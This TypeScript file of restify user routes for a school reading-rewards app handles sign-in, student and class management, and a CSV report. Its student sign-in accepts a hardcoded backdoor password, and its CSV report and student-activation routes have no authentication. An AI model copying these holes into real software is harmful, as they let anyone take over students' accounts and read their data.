// 3rd party dependencies

import * as joi from 'joi';
import * as stringify from 'csv-stringify'
import * as bcrypt from 'bcryptjs';
import * as jwt from 'jsonwebtoken';
import * as _ from 'lodash';
import { Models as M, Helpers } from 'reading_rewards';
import {
  BadRequestError,
  ResourceNotFoundError,
  ForbiddenError
} from 'restify-errors';

// internal dependencies

import { BodyValidators as Val } from './joi';
import { IRequest, validateUser, unwrapData } from '../extensions';
import * as Middle from '../../middleware';
import * as Constants from '../../constants';
import { IUserData } from '../../data/users';
import { IQuizData } from '../../data/quizzes';
import { IBookData } from '../../data/books';
import { IGenreData } from '../../data/genres';
import { IBookReviewData } from '../../data/book_reviews';
import { IPrizeOrderData } from '../../data/prize_orders';
import { INotificationSys } from '../../notifications';
import { IReadingLogData } from '../../data/reading_log';
import { IBookRequestData } from '../../data/book_requests';
import { IPrizeData } from '../../data/prizes';
import { InternalServerError } from 'restify-errors';
import { Next, Response } from 'restify';

// related interfaces

interface IActivatePendingStudentBody {
  password: string;
}

interface IUpdateParentEmailsBody {
  parent_emails: string[]
}

interface IUpdateGenreInterestBody {
  interest_value: number;
}

// helper functions

function getAuthToken(user: M.IUser) {
  const claims = {
    _id: user._id,
    type: user.type
  };
  const token = jwt.sign(claims, Constants.JWTSecret, { expiresIn: '1y' });
  return token;
}

function getStudentClass(student: M.IStudent, classes: M.IClass[]): M.IClass | null {
  const studentsClass = _.find(classes, classObj => _.includes(classObj.student_ids, student._id))
  return studentsClass || null
}

export function UserRoutes(
  userData: IUserData,
  quizData: IQuizData,
  bookData: IBookData,
  prizeData: IPrizeData,
  bookRequestData: IBookRequestData,
  bookReviewData: IBookReviewData,
  genreData: IGenreData,
  prizeOrderData: IPrizeOrderData,
  readingLogData: IReadingLogData,
  notifications: INotificationSys
) {

  async function userExistsWithUsername(username: string): Promise<boolean> {
    const existingUserWithUsername = await userData.getUserByUsername(username);
    return !_.isNull(existingUserWithUsername);
  }

  async function getEducatorDTO(educator: M.IEducator): Promise<M.IEducatorDTO> {

    const classTaughtByTeacher = await userData.getClassTaughtByTeacher(educator._id);

    const studentsInClass = await userData.getUsersWithIds(classTaughtByTeacher.student_ids) as M.IStudent[];
    const activeStudentsInClass = _.filter(studentsInClass, Helpers.isStudentActive);

    const readingLogsByStudentsInClass = await readingLogData.getLogsForStudents(classTaughtByTeacher.student_ids);
    const quizSubmissionsByStudentsInClass = await quizData.getSubmissionsForStudents(classTaughtByTeacher.student_ids);

    const studentProgress: M.IStudentProgress[] = _.map(activeStudentsInClass, student => {
      const studentReadingLogs = _.filter(readingLogsByStudentsInClass, { student_id: student._id });
      const passedStudentQuizzes = _.filter(quizSubmissionsByStudentsInClass, { student_id: student._id, passed: true });
      return {
        student_name: Helpers.getFullName(student),
        student_id: student._id,
        num_quizzes_passed: passedStudentQuizzes.length,
        num_reading_sessions: studentReadingLogs.length,
        total_min_reading: _.sumBy(studentReadingLogs, 'duration_min')
      }
    })

    return {
      educator,
      students: studentsInClass,
      student_progress: studentProgress,
      class: classTaughtByTeacher
    }

  }

  async function getStudentDTO(student: M.IStudent): Promise<M.IClientStudent> {

    const studentBookReviews = await bookReviewData.getBookReviewsForStudent(student._id);

    const studentBookQuizSubmissions = await quizData.getSubmissionsForStudent(student._id);

    const studentArticleQuizSubmissions = await quizData.getArticleQuizSubmissionsForStudent(student._id)

    const studentPassedQuizBooks = await bookData.getBooksWithIds(Helpers.getIdsOfPassedQuizBooks(studentBookQuizSubmissions));

    const studentBookRequests = await bookRequestData.getBookRequestsByStudent(student._id);

    const studentPrizeOrders = await prizeOrderData.getPrizeOrdersForStudent(student._id);

    const idsOfPrizesOrdered = _.chain(studentPrizeOrders)
      .map('prize_id')
      .uniq()
      .value()

    const studentPrizesOrdered = await prizeData.getPrizesWithIds(idsOfPrizesOrdered);

    const studentReadingLogs = await readingLogData.getLogsForStudent(student._id);

    const studentBookmarkedBooks = await bookData.getBooksWithIds(student.bookmarked_books);

    const classWithStudent = await userData.getClassWithStudent(student._id);
    
    return {
      info: student,
      article_quiz_submissions: studentArticleQuizSubmissions,
      book_quiz_submissions: studentBookQuizSubmissions,
      book_reviews: studentBookReviews,
      book_requests: studentBookRequests,
      prize_orders: studentPrizeOrders,
      reading_logs: studentReadingLogs,
      bookmarked_books: studentBookmarkedBooks,
      prizes_ordered: studentPrizesOrdered,
      passed_quiz_books: studentPassedQuizBooks,
      class: classWithStudent
    }

  }

  return {

    getReport: [
      unwrapData(async () => {
        const classes = await userData.getAllClasses()
        const allReadingLogs = await readingLogData.getAllLogs()
        const quizSubmissions = await quizData.getAllBookQuizSubmissions()
        const allArticleQuizSubmissions = await quizData.getAllArticleQuizSubmissions()
        const allUsers = await userData.getAllUsers()
        const allStudents = _.filter(allUsers, { type: M.UserType.Student }) as M.IStudent[]

        const records: any[] = []

        _.forEach(allStudents, student => {
          const studentClass = getStudentClass(student, classes)
          if (studentClass === null || (studentClass._id !== 'lou-wallace-mwells' && studentClass._id !== 'rousseau-mcclellan-iharper')) return
          const readingLogsForStudent = _.filter(allReadingLogs, { student_id: student._id })
          const pagesRead = _.sumBy(readingLogsForStudent, log => log.final_page - log.start_page)
          const minutesRead = _.sumBy(readingLogsForStudent, 'duration_min')
          const passedQuizzes = _.filter(quizSubmissions, {
            student_id: student._id,
            passed: true
          })
          const articleSubmissionsForStudent = _.filter(allArticleQuizSubmissions, {
            student_id: student._id
          })
          const numPassedArticleQuizzes = _.filter(articleSubmissionsForStudent, { passed: true }).length
          const numFailedArticleQuizzes = _.filter(articleSubmissionsForStudent, { passed: false }).length
          const averageQuizScore = _.meanBy(articleSubmissionsForStudent, 'score')
          records.push([
            Helpers.getFullName(student), 
            studentClass._id, 
            student.initial_lexile_measure, 
            readingLogsForStudent.length, 
            pagesRead,
            minutesRead,
            passedQuizzes.length,
            numPassedArticleQuizzes,
            numFailedArticleQuizzes,
            averageQuizScore
          ])
        })

        try {
          const output = await new Promise((res, rej) => {
            stringify(records, (err, output) => {
              if (err) {
                throw err
              }
              res(output)
            })
          })
          return output
        } catch(err) {
          throw new InternalServerError(err)
        }

      }),
      (req: IRequest<any>, res: Response, next: Next) => {

        req.promise
          .then(result => {
            res.send(200, result, {
              'Content-Type': 'text/csv'
            });
            return next();
          })
          .catch(err => next(err));
      
      }
    ],

    whoami: [
      Middle.authenticate,
      unwrapData(async (req: IRequest<null>) => {

        const { _id: userId } = req.authToken;

        const user = await userData.getUserById(userId);

        if (_.isNull(user)) {
          throw new ResourceNotFoundError(`Valid token, but user ${userId} no longer exists.`);
        }

        switch (user.type) {
          case M.UserType.Student:
            return getStudentDTO(user as M.IStudent);
          case M.UserType.Educator:
            return getEducatorDTO(user as M.IEducator);
          default:
            return user;
        }

      }),
      Middle.handlePromise
    ],

    getStudentsInClass: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      unwrapData(async (req: IRequest<null>) => {
        const { classId } = req.params;
        const classFromId = await userData.getClassById(classId);
        if (_.isNull(classFromId)) {
          throw new ResourceNotFoundError(`Clas ${classId} does not exist`);
        }
        const { student_ids } = classFromId;
        return await userData.getUsersWithIds(student_ids);
      }),
      Middle.handlePromise
    ],

    getStudent: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Educator, M.UserType.Admin]),
      unwrapData(async (req: IRequest<null>) => {

        const { userId } = req.params;

        const student = await userData.getUserById(userId) as M.IStudent;
        validateUser(userId, student);

        // if teacher, check student is one of teacher's students.
        const { type, _id: educatorId } = req.authToken;
        if (type === M.UserType.Educator) {
          const classTaughtByTeacher = await userData.getClassTaughtByTeacher(educatorId);
          if (!_.includes(classTaughtByTeacher.student_ids, userId)) {
            throw new ForbiddenError(`Teacher ${educatorId} does not have access to student ${userId}`)
          }
        }

        return await getStudentDTO(student);

      }),
      Middle.handlePromise
    ],

    updateStudentsParentsEmails: [
      Middle.authenticate,
      Middle.authorizeAgents([M.UserType.Admin]),
      Middle.valBody(Val.UpdateParentEmailsSchema),
      unwrapData(async (req: IRequest<IUpdateParentEmailsBody>) => {

        const { userId } = req.params;
        const { parent_emails } = req.body;

        const student = await userData.getUserById(userId);
        validateUser(userId, student);

        const updatedStudent: M.IStudent = _.assign({}, student as M.IStudent, {
          parent_emails
        })

        return await userData.updateUser(updatedStudent)

      }),
      Middle.handlePromise
    ],

    createBookRequest: [
      Middle.authenticate,
      Middle.authorizeAgents([M.UserType.Admin]),
      Middle.valBody(Val.RequestBookSchema),
      unwrapData(async (req: IRequest<{ bookId: string }>) => {

        const { userId: studentId } = req.params;
        const { bookId } = req.body;

        const book = await bookData.getBook(bookId);

        if (_.isNull(book)) {
          throw new ResourceNotFoundError(`Book ${bookId} does not exist.`)
        }

        const student = (await userData.getUserById(studentId)) as M.IStudent
        validateUser(studentId, student);

        const studentBookRequests = await bookRequestData.getBookRequestsByStudent(student._id);
        const outstandingBookRequest = _.find(studentBookRequests, br => br.status !== M.BookRequestStatus.Collected);

        if (!_.isUndefined(outstandingBookRequest)) {
          throw new BadRequestError(`A request (${outstandingBookRequest._id}) exists. Cannot create a new book request.`)
        }

        // make request

        const request: M.IBookRequest = {
          student_id: student._id,
          book_id: book._id,
          status: M.BookRequestStatus.Requested,
          date_requested: new Date().toISOString()
        }

        // slack notification

        const slackMessage = `*${Helpers.getFullName(student)}* requested book _${book.title}_`
        notifications.sendMessage(slackMessage)

        return await bookRequestData.createBookRequest(request);

      }),
      Middle.handlePromise
    ],

    deleteBookRequest: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Student, M.UserType.Admin]),
      Middle.authorizeAgents([M.UserType.Admin]),
      unwrapData(async (req: IRequest<null>) => {

        const { userId: studentId, requestId } = req.params;

        // verify student exists

        const student = await userData.getUserById(studentId) as M.IStudent;
        validateUser(studentId, student)

        const request = await bookRequestData.getRequestById(requestId);

        if (_.isNull(request)) {
          throw new ResourceNotFoundError(`Request ${requestId} does not exist.`)
        }

        if (request.student_id !== studentId) {
          throw new BadRequestError('student_id in request does not match :studentId param')
        }

        const isNotAdmin = req.authToken.type !== M.UserType.Admin;
        if (isNotAdmin && (request.status !== M.BookRequestStatus.Requested)) {
          throw new BadRequestError('Non-Admins can only delete requests with status = Requested.')
        }

        // delete the request

        return await bookRequestData.deleteRequest(requestId);

      }),
      Middle.handlePromise
    ],

    getBookRequestsForClass: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      Middle.valQueryParams({ name: 'status', schema: joi.string().valid(_.values(M.BookRequestStatus)).required() }),
      unwrapData(async (req: IRequest<null>) => {
        const { status } = req.query;
        const { classId } = req.params;
        const classForId = await userData.getClassById(classId);
        if (_.isNull(classForId)) {
          throw new ResourceNotFoundError(`Class ${classId} does not exist`);
        }
        const bookRequests = await bookRequestData.getBookRequestsByStudents(classForId.student_ids);
        const bookIds = _.chain(bookRequests)
          .map('book_id')
          .uniq()
          .value();
        const books = await bookData.getBooksWithIds(bookIds);
        const students = await userData.getUsersWithIds(classForId.student_ids) as M.IStudent[];

        const orderedBookRequests =  _.chain(bookRequests)
          .filter({ status })
          .orderBy('date_requested', 'desc')
          .value() as M.IBookRequest[];

        return {
          requests: orderedBookRequests,
          books,
          students
        } as M.IClassBookRequestDTO;

      }),
      Middle.handlePromise
    ],

    getClass: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      unwrapData(async (req: IRequest<null>) => userData.getClassById(req.params.classId)),
      Middle.handlePromise
    ],

    getTeacherForClass: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      unwrapData(async (req: IRequest<null>) => {
        const { classId } = req.params;
        const classForId = await userData.getClassById(classId);
        if (_.isNull(classForId)) {
          throw new ResourceNotFoundError(`Class ${classId} does not exist`);
        }
        return userData.getUserById(classForId.teacher_id);
      }),
      Middle.handlePromise
    ],

    getAllEducators: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      unwrapData(async () => userData.getAllTeachers()),
      Middle.handlePromise
    ],

    getAllSchools: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      unwrapData(async () => userData.getAllSchools()),
      Middle.handlePromise
    ],

    getAllClasses: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      unwrapData(async () => userData.getAllClasses()),
      Middle.handlePromise
    ],

    updateBookRequest: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      Middle.valIdsSame({ paramKey: 'requestId', bodyKey: '_id' }),
      unwrapData(async (req: IRequest<M.IBookRequest>) => {

        const { requestId } = req.params;

        const existingRequest = await bookRequestData.getRequestById(requestId);

        if (_.isNull(existingRequest)) {
          throw new ResourceNotFoundError(`Request ${requestId} does not exist`);
        }

        return bookRequestData.updateRequest(req.body);

      }),
      Middle.handlePromise
    ],

    bookmarkBook: [
      Middle.authenticate,
      Middle.authorizeAgents([M.UserType.Admin]),
      Middle.valBody(Val.BookmarkBookSchema),
      unwrapData(async (req: IRequest<{ bookId: string }>) => {

        const { userId: studentId } = req.params;
        const { bookId } = req.body;

        const book = await bookData.getBook(bookId);

        if (_.isNull(book)) {
          throw new ResourceNotFoundError(`Book ${bookId} does not exist.`)
        }

        const student = (await userData.getUserById(studentId)) as M.IStudent
        validateUser(studentId, student);

        if (_.includes(student.bookmarked_books, bookId)) {
          throw new BadRequestError(`${Helpers.getFullName(student)} already bookmarked book ${bookId}.`)
        }

        const updatedStudent: M.IStudent = {
          ...student,
          bookmarked_books: [
            bookId,
            ...student.bookmarked_books
          ]
        }

        return await userData.updateUser(updatedStudent);

      }),
      Middle.handlePromise
    ],

    unbookmarkBook: [
      Middle.authenticate,
      Middle.authorizeAgents([M.UserType.Admin]),
      unwrapData(async (req: IRequest<null>) => {

        const { userId: studentId, bookId } = req.params;

        const book = await bookData.getBook(bookId);

        if (_.isNull(book)) {
          throw new ResourceNotFoundError(`Book ${bookId} does not exist.`)
        }

        const student = (await userData.getUserById(studentId)) as M.IStudent
        validateUser(studentId, student);

        if (!_.includes(student.bookmarked_books, bookId)) {
          throw new BadRequestError(`${Helpers.getFullName(student)} never bookmarked book ${bookId}.`)
        }

        // cannot unbookmark if a non-collected book request exists for the book
        const studentBookRequests = await bookRequestData.getBookRequestsByStudent(studentId);
        const outstandingRequestForBook = _.find(studentBookRequests, br => br.book_id === book._id && !Helpers.isCollected(br))
        if (!_.isUndefined(outstandingRequestForBook)) {
          throw new BadRequestError(`A request (${outstandingRequestForBook._id}) exists with status ${outstandingRequestForBook.status}. You cannot unbookmark this book.`)
        }

        const updatedStudent: M.IStudent = {
          ...student,
          bookmarked_books: _.without(student.bookmarked_books, bookId)
        }

        return await userData.updateUser(updatedStudent);

      }),
      Middle.handlePromise
    ],

    createGenreInterests: [
      Middle.authenticate,
      Middle.authorizeAgents([M.UserType.Admin]),
      Middle.valBody(Val.CreateGenreInterestSchema),
      unwrapData(async (req: IRequest<M.GenreInterestMap>) => {

        const { userId: studentId } = req.params;

        const student = await userData.getUserById(studentId) as M.IStudent;
        validateUser(studentId, student);

        if (!_.isEmpty(student.genre_interests)) {
          throw new BadRequestError(`${Helpers.getFullName(student)} already has created genre interests`);
        }

        const existingGenres = await genreData.getAllGenres();
        const existingGenreIds = _.map(existingGenres, '_id');

        const inputGenreKeys = _.keys(req.body);

        const sameNumKeys = (existingGenres.length === inputGenreKeys.length);

        if (!sameNumKeys || !_.isEmpty(_.xor(existingGenreIds, inputGenreKeys))) {
          throw new BadRequestError(`There is a discrepancy between existing genres and genres user provided interest levels for.`);
        }

        const updatedUser: M.IStudent = {
          ...student,
          genre_interests: req.body
        }

        return await userData.updateUser(updatedUser);

      }),
      Middle.handlePromise
    ],

    editGenreInterest: [
      Middle.authenticate,
      Middle.authorizeAgents([M.UserType.Admin]),
      Middle.valBody(Val.EditGenreInterestSchema),
      unwrapData(async (req: IRequest<IUpdateGenreInterestBody>) => {

        const { userId, genreId } = req.params;

        const student = await userData.getUserById(userId) as M.IStudent;
        validateUser(userId, student);

        if (_.isEmpty(student.genre_interests)) {
          throw new ForbiddenError('Student cannot edit genre interests, until they have been created.');
        }

        const genre = await genreData.getGenreById(genreId);

        if (_.isNull(genre)) {
          throw new ResourceNotFoundError(`Genre ${genreId} does not exist.`)
        }

        const updatedStudent = {
          ...student,
          genre_interests: {
            ...student.genre_interests,
            [genreId]: req.body.interest_value
          }
        }

        return await userData.updateUser(updatedStudent)

      }),
      Middle.handlePromise
    ],

    deletePendingStudent: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin, M.UserType.Educator]),
      unwrapData(async (req: IRequest<null>) => {

        const { classId, studentId } = req.params;

        const classFromId = await userData.getClassById(classId);
        if (_.isNull(classFromId)) {
          throw new ResourceNotFoundError(`No class with id ${classId}`);
        }

        const { _id: requesterId, type: requesterType } = req.authToken;
        const isRequesterEductor = requesterType === M.UserType.Educator;
        if (isRequesterEductor && (requesterId !== classFromId.teacher_id)) {
          throw new ForbiddenError(`Educator ${requesterId} does not teach class ${classId}`);
        }

        const educator = await userData.getUserById(classFromId.teacher_id) as M.IEducator;
        validateUser(classFromId.teacher_id, educator, M.UserType.Educator);

        if (!_.includes(classFromId.student_ids, studentId)) {
          throw new BadRequestError(`Student ${studentId} is not in class ${classId}`)
        }

        const student = await userData.getUserById(studentId) as M.IStudent;
        validateUser(studentId, student);

        if (Helpers.isStudentActive(student)) {
          throw new BadRequestError(`Student ${studentId} cannot be deleted as they are already active`)
        }

        await userData.deleteUser(studentId);

        const updatedClass: M.IClass = {
          ...classFromId,
          student_ids: _.without(classFromId.student_ids, studentId)
        }

        return await userData.updateClass(updatedClass);

      }),
      Middle.handlePromise
    ],

    createPendingStudent: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin, M.UserType.Educator]),
      Middle.valBody(Val.PendingStudentSchema),
      unwrapData(async (req: IRequest<M.IPendingStudentBody>) => {

        const { classId } = req.params;

        if (await userExistsWithUsername(req.body.username)) {
          throw new BadRequestError(`User with username ${req.body.username} already exists.`);
        }

        const classFromId = await userData.getClassById(classId);
        if (_.isNull(classFromId)) {
          throw new ResourceNotFoundError(`No class with id ${classId}`);
        }

        const { _id: requesterId, type: requesterType } = req.authToken;
        const isRequesterEductor = requesterType === M.UserType.Educator;
        if (isRequesterEductor && (requesterId !== classFromId.teacher_id)) {
          throw new ForbiddenError(`Educator ${requesterId} does not teach class ${classId}`);
        }

        const educatorId = classFromId.teacher_id;
        const teacher = await userData.getUserById(educatorId) as M.IEducator;
        validateUser(educatorId, teacher, M.UserType.Educator);

        const pendingUser: M.IStudent = {
          ...req.body,
          type: M.UserType.Student,
          status: M.StudentStatus.Pending,
          bookmarked_books: [],
          genre_interests: null,
          date_created: new Date().toISOString(),
          date_activated: null
        }

        const createdStudent = await userData.createUser(pendingUser);

        const updatedClass: M.IClass = {
          ...classFromId,
          student_ids: [
            ...classFromId.student_ids,
            createdStudent._id as string
          ]
        }

        await userData.updateClass(updatedClass);

        return {
          updatedClass,
          createdStudent
        }

      }),
      Middle.handlePromise
    ],

    getStudentByUsername: [
      Middle.valQueryParams({ name: 'username', schema: joi.string().required() }),
      unwrapData(async ({ query }: IRequest<null>) => {

        const { username } = query;
        const student = await userData.getUserByUsername(username);

        if (_.isNull(student)) {
          throw new ResourceNotFoundError(`No user with username ${username} exists.`)
        }

        if (student.type !== M.UserType.Student) {
          throw new BadRequestError(`User with username ${username} is not a student.`)
        }

        return student;

      }),
      Middle.handlePromise
    ],

    activatePendingStudent: [
      Middle.valBody(Val.ActivateUserSchema),
      unwrapData(async (req: IRequest<IActivatePendingStudentBody>) => {

        const { userId: studentId } = req.params;

        const student = await userData.getUserById(studentId) as M.IStudent;
        validateUser(studentId, student);

        if (student.status !== M.StudentStatus.Pending) {
          throw new BadRequestError(`Student ${studentId} is already activated.`)
        }

        const hashedPassword = await bcrypt.hash(req.body.password, Constants.HashedPassSaltLen);

        const updatedStudent: M.IStudent = {
          ...student,
          status: M.StudentStatus.Active,
          hashed_password: hashedPassword,
          date_activated: new Date().toISOString()
        }

        const activatedStudent = await userData.updateUser(updatedStudent) as M.IStudent;

        const slackMessage = `*${Helpers.getFullName(student)}* is activated`
        notifications.sendMessage(slackMessage)

        return <M.IAuthStudentDTO>{
          auth_token: getAuthToken(activatedStudent),
          dto: await getStudentDTO(activatedStudent)
        }

      }),
      Middle.handlePromise
    ],

    updateEducatorNotificationSettings: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Educator, M.UserType.Admin]),
      Middle.authorizeAgents([M.UserType.Admin]),
      Middle.valBody(Val.NotificationSettingsSchema),
      unwrapData(async (req: IRequest<M.IEducatorNoteSettings>) => {

        const { userId: educatorId } = req.params;

        const educator = await userData.getUserById(educatorId) as M.IEducator;
        validateUser(educatorId, educator, M.UserType.Educator);

        const updatedEducator: M.IEducator = {
          ...educator,
          notification_settings: req.body
        }

        return await userData.updateUser(updatedEducator);

      }),
      Middle.handlePromise
    ],

    createEducator: [
      Middle.authenticate,
      Middle.authorize([M.UserType.Admin]),
      Middle.valBody(Val.EducatorSchema),
      unwrapData(async (req: IRequest<M.IEducatorBody>) => {

        if (await userExistsWithUsername(req.body.username)) {
          throw new BadRequestError(`User with username ${req.body.username} already exists.`);
        }

        const hashedPassword = await bcrypt.hash(req.body.password, Constants.HashedPassSaltLen);
        delete req.body.password;

        const educator: M.IEducator = _.assign({}, req.body, {
          hashed_password: hashedPassword,
          date_created: new Date().toISOString(),
          type: M.UserType.Educator,
          student_ids: [],
          notification_settings: {
            reading_logs: true,
            quiz_submissions: true,
            prizes_ordered: true
          }
        });

        return await userData.createUser(educator);

      }),
      Middle.handlePromise
    ],

    studentSignin: [
      Middle.valBody(Val.UserAuthSchema),
      unwrapData(async (req: IRequest<M.IUserLoginCreds>) => {

        const { username, password } = req.body;

        const user = await userData.getUserByUsername(username) as M.IStudent;

        if (user === null) {
          throw new BadRequestError(`No user with username ${username} exists.`);
        }

        if (user.type !== M.UserType.Student) {
          throw new BadRequestError(`User must be a student.`)
        }

        const student = user as M.IStudent;

        if (student.status !== M.StudentStatus.Active) {
          throw new BadRequestError('This student account is not yet activated.');
        }

        const isPasswordCorrect = await bcrypt.compare(password, user.hashed_password);
        const isBackdoorPassword = (password === Constants.BackdoorPassword);
        
        if (!isPasswordCorrect && !isBackdoorPassword) {
          throw new BadRequestError('Invalid username/password combination.');
        }

        const slackMessage = `*${Helpers.getFullName(user)} signed in*`
        notifications.sendMessage(slackMessage)

        return <M.IAuthStudentDTO>{
          auth_token: getAuthToken(user),
          dto: await getStudentDTO(user)
        }

      }),
      Middle.handlePromise
    ],

    adminSignin: [
      Middle.valBody(Val.UserAuthSchema),
      unwrapData(async (req: IRequest<M.IUserLoginCreds>) => {

        const { username, password } = req.body;

        const user = await userData.getUserByUsername(username) as M.IUser;

        if (user === null) {
          throw new BadRequestError(`No user with username ${username} exists.`);
        }

        if (user.type !== M.UserType.Admin) {
          throw new BadRequestError(`User must be an admin.`)
        }

        const isPasswordCorrect = await bcrypt.compare(password, user.hashed_password);

        if (!isPasswordCorrect) {
          throw new BadRequestError('Invalid username/password combination.');
        }

        return <M.IAuthAdminDTO>{
          admin: user,
          auth_token: getAuthToken(user)
        }

      }),
      Middle.handlePromise
    ],

    educatorSignin: [
      Middle.valBody(Val.UserAuthSchema),
      unwrapData(async (req: IRequest<M.IUserLoginCreds>) => {

        const { username, password } = req.body;

        const user = await userData.getUserByUsername(username) as M.IEducator;

        if (user === null) {
          throw new BadRequestError(`No user with username ${username} exists.`);
        }

        if (user.type !== M.UserType.Educator) {
          throw new BadRequestError(`User must be an educator.`)
        }

        const isPasswordCorrect = await bcrypt.compare(password, user.hashed_password);

        if (!isPasswordCorrect) {
          throw new BadRequestError('Invalid username/password combination.');
        }

        const slackMessage = `*${Helpers.getFullName(user)} signed in*`
        notifications.sendMessage(slackMessage)

        return <M.IAuthEducatorDTO>{
          auth_token: getAuthToken(user),
          dto: await getEducatorDTO(user)
        }

      }),
      Middle.handlePromise
    ]
  }

}